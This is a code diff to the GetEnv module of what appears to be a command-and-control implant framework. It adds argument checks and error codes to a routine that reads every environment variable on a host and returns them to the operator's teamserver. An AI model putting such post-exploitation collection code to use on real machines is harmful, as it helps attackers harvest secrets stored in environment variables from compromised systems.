@@ -51,6 +51,11 @@ std::string GetEnv::getInfo()
 int GetEnv::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    if (splitedCmd.size() != 1)
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
     c2Message.set_instruction(splitedCmd[0]);
 #endif
 
@@ -59,19 +64,29 @@ int GetEnv::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
 
 int GetEnv::process(C2Message& c2Message, C2Message& c2RetMessage)
 {
-    std::string out = listEnv();
+    std::string out;
+    const bool read = listEnv(out);
     c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_returnvalue(out);
+    c2RetMessage.set_errorCode(read ? 0 : 1);
     return 0;
 }
 
-std::string GetEnv::listEnv()
+int GetEnv::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
 {
-    std::string result;
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    if (c2RetMessage.errorCode() == 1)
+        errorMsg = "Failed: Could not retrieve environment";
+#endif
+    return 0;
+}
+
+bool GetEnv::listEnv(std::string& result)
+{
 #ifdef _WIN32
     LPCH env = GetEnvironmentStringsA();
     if(!env)
-        return "Could not retrieve environment";
+        return false;
     for(LPCH var = env; *var; var += strlen(var) + 1)
     {
         result += var;
@@ -80,13 +95,13 @@ std::string GetEnv::listEnv()
     FreeEnvironmentStringsA(env);
 #else
     if(!environ)
-        return result;
+        return false;
     for(char **p = environ; *p; ++p)
     {
         result += *p;
         result += "\n";
     }
 #endif
-    return result;
+    return true;
 }
 
